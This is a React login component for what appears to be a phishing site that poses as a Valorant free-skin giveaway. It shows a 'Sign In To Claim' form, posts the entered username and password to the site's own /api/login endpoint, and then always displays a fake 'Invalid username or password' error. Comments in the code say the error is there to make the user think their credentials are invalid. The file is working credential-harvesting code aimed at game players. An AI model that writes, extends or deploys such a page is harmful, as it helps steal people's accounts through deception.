import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";

const Login = () => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  // Check if user has a skin to claim from localStorage
  const hasSkin = localStorage.getItem("alreadySpun") === "true";
  
  // Redirect if no skin to claim
  if (!hasSkin) {
    if (typeof window !== "undefined") {
      setLocation("/");
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      // Send login info to server via API
      await apiRequest("POST", "/api/login", { username, password });
      
      // Always show an error message regardless of whether the submission was successful
      // This makes the user think their credentials are invalid
      toast({
        title: "Error",
        description: "Invalid username or password. Please try again.",
        variant: "destructive",
      });
    } catch (error) {
      console.error("Login error:", error);
      toast({
        title: "Error",
        description: "An error occurred. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-[#0F1923]/90 flex items-center justify-center z-50 hexagon-bg">
      <div className="valorant-card bg-[#1F2731] max-w-md w-full p-8 animate-slide-up">
        <h2 className="text-3xl font-bold mb-6 text-center uppercase text-[#ECE8E1]">
          Sign In <span className="text-[#FF4655]">To Claim</span>
        </h2>
        
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <Label className="block text-sm font-bold uppercase tracking-wider mb-2 text-[#ECE8E1]">
              Username
            </Label>
            <Input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="valorant-input w-full bg-[#0F1923] border-2 border-[#FF4655]/50 p-3 focus:border-[#FF4655] focus:outline-none text-[#ECE8E1]"
              required
            />
          </div>
          
          <div>
            <Label className="block text-sm font-bold uppercase tracking-wider mb-2 text-[#ECE8E1]">
              Password
            </Label>
            <Input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="valorant-input w-full bg-[#0F1923] border-2 border-[#FF4655]/50 p-3 focus:border-[#FF4655] focus:outline-none text-[#ECE8E1]"
              required
            />
          </div>
          
          <div className="pt-4">
            <Button
              type="submit"
              disabled={isSubmitting}
              className="valorant-button bg-[#FF4655] w-full py-6 px-4 uppercase font-bold tracking-wider hover:brightness-110 transition duration-300 text-white"
            >
              {isSubmitting ? "Processing..." : "Login & Claim"}
            </Button>
          </div>
        </form>
        
        {/* Footer text removed as requested */}
      </div>
    </div>
  );
};

export default Login;
